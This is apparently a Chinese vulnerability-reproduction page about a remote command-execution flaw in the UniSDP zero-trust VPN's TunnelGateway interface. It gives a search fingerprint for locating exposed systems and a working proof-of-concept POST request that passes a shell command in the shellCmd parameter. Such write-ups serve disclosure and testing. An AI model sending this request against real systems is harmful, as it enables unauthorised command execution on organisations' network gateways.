---
title: "联软安界 UniSDP 软件定义边界系统 commondRetSt 命令执行漏洞"
date: 2026-10-18 09:16:46
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "联软安界-UniSDP-软件定义边界系统"
tags:
  - "联软安界-UniSDP-软件定义边界系统"
  - "命令执行"
  - "漏洞复现"
---
## 漏洞描述

联软安界UniSDP软件定义边界系统是基于零信任的下一代VPN，该系统2021.04.28版本中TunnelGateway某接口存在安全漏洞，漏洞允许攻击者将特制请求发送到服务器并远程命令执行。

## 漏洞影响

```
联软安界 UniSDP 软件定义边界系统
```

## 网络测绘

```
title="UniSSOView"
```

## 漏洞复现

登录页面

![image-20230314090312164](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20230314090312164.png)

验证POC

```
POST /TunnelGateway/commondRetStr
  
shellCmd=id
```

![image-20230314090322883](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20230314090322883.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/%E8%81%94%E8%BD%AF%E5%AE%89%E7%95%8C-UniSDP-%E8%BD%AF%E4%BB%B6%E5%AE%9A%E4%B9%89%E8%BE%B9%E7%95%8C%E7%B3%BB%E7%BB%9F-commondRetSt-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md)
